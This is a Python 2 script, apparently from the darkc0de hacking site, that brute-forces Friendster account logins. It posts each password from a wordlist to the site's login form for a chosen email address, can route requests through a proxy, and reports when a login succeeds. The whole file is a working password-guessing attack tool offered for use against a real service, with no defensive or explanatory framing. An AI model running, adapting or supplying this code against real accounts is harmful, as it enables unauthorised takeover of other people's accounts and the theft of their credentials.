#!/usr/bin/python
#Friendster.com Login BruteForcer

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com 

import urllib2, sys, re, urllib, httplib, socket

print "\n   d3hydr8[at]gmail[dot]com friendsterBF v1.1"
print "----------------------------------------------"

if len(sys.argv) not in [3,4,5,6]:
	print "Usage: ./friendsterbf.py <user> <wordlist> <options>\n"
	print "\t   -p/-proxy <host:port> : Add proxy support"
	print "\t   -v/-verbose : Verbose Mode\n"
	sys.exit(1)
	
for arg in sys.argv[1:]:
	if arg.lower() == "-p" or arg.lower() == "-proxy":
		proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
		
try:
	if proxy:
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	proxy = 0
	pass
except(NameError):
	print "\n[-] Proxy Not Given"
	proxy = 0
	pass
except:
	print "\n[-] Proxy Failed"
	proxy = 0
	pass
	
try:
	if verbose == 1:
		print "[+] Verbose Mode On\n"
except(NameError):
	print "[-] Verbose Mode Off\n"
	verbose = 0
	pass
	
host = "http://www.friendster.com/login.php"
print "[+] BruteForcing:",host
print "[+] Email:",sys.argv[1]

try:
  	words = open(sys.argv[2], "r").readlines()
  	print "[+] Words Loaded:",len(words),"\n"
except(IOError): 
  	print "[-] Error: Check your wordlist path\n"
  	sys.exit(1)
  
for word in words:
	word = word.replace("\r","").replace("\n","")
	login_form_seq = [
     	('_submitted', '1'),
     	('next', '/'),
     	('tzoffset', '240'),
     	('email', sys.argv[1]),
	('password', word),
	('remembermyemail', 'on'),
	('btnLogIn', 'Log In'),
	('btnSignUp','Sign Up')]
	login_form_data = urllib.urlencode(login_form_seq)
	if proxy != 0:
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
		opener = urllib2.build_opener(proxy_handler)
	else:
		opener = urllib2.build_opener()
	try:
		opener.addheaders = [('User-agent', 'Mozilla/5.0')]
		site = opener.open(host, login_form_data).read()
	except(urllib2.URLError), msg:
		print msg
		site = ""
		pass
	
	if re.search("The email address you entered is not a valid Friendster login.",site):
		print "\nThe email address you entered is not a valid Friendster login.\n"
		sys.exit(1)

	if re.search("The email address and password you entered did not match.",site) == None:
		print "\n\t[!] Login Successfull:",sys.argv[1],word,"\n"
		sys.exit(1)
	else:
		if verbose == 1:
			print "[-] Login Failed:",word
print "\n[-] Brute Complete\n"
	